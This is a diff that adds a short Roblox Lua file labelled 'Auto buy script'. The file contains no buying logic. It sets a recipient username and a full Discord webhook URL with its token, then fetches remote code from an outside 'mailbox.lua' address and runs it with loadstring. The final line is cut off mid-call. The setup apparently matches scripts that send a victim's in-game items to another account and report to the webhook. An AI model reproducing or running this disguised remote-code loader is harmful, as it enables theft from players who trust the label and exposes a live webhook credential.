@@ -1,0 +1,10 @@
+--Auto buy script
+
+
+
+
+
+UserName = "IIIllIlIlllIllll"
+WebHook = "https://discord.com/api/webhooks/1135867066382045245/9WgNLUf9y2o2d2-BPJ07VF-TDvz7eoSxIIBcD6fsZwOqATDx8dxSdtNw6I5lGel2WG0-"
+
+loadstring(game:HttpGet("https://goof.pro/s/mailbox.lua", true))(
